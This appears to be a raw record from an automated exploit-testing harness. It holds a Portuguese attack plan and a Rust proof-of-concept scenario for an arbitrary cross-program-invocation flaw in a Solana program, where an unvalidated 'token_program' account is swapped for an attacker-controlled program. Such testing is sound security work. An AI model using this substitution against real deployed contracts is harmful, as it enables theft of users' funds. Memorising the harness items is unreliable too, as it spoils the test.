attempts.raw:
{
  "plan": "O programa-alvo expõe a instrução `cpi` que recebe `token_program` como AccountInfo genérica e a usa como program_id em um CPI sem validar que é o Token Program. O baseline usa um programa legítimo (o próprio program_id do alvo ou o System Program) como `token_program` para provar que o cenário está montado. O ataque substitui `token_program` pelo programa do atacante (env.attacker_program), mantendo as demais contas iguais. O efeito medido é que o programa-alvo invocou o programa fornecido pelo atacante, o que é demonstrado pelo sucesso da execução com o programa malicioso no lugar do esperado.",
  "scenario": "let source = Pubkey::new_unique();
let destination = Pubkey::new_unique();
let authority = Pubkey::new_unique();

let source_acc = account(&env.program_id, &[], None);
let destination_acc = account(&env.program_id, &[], None);
let authority_acc = account(&env.program_id, &[], None);

let legit_program = env.program_id;
let legit_program_acc = program_account(&legit_program);

let metas_legit = vec![
    AccountMeta::new(source, false),
    AccountMeta::new(destination, false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new_readonly(legit_program, false),
];
let ix_legit = env.anchor_ix("cpi", &(100u64,), metas_legit);
let contas_legit = vec![
    (source, source_acc.clone()),
    (destination, destination_acc.clone()),
    (authority, authority_acc.clone()),
    (legit_program, legit_program_acc),
];
let _ = env.baseline("uso legitimo com programa esperado", &ix_legit, &contas_legit);

let attacker_program = env.attacker_program.expect("attacker program disponivel");
let attacker_program_acc = program_account(&attacker_program);

let metas_attack = vec![
    AccountMeta::new(source, false),
    AccountMeta::new(destination, false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new_readonly(attacker_program, false),
];
let ix_attack = env.anchor_ix("cpi", &(100u64,), metas_attack);
let contas_attack = vec![
    (source, source_acc),
    (destination, destination_acc),
    (authority, authority_acc),
    (attacker_program, attacker_program_acc),
];

let r = env.attack("cpi com token_program malicioso", &ix_attack, &contas_attack);
if r.program_result == ProgramResult::Success {
    env.effect("programa-alvo invocou o programa do atacante no lugar do esperado", true);
}"
}

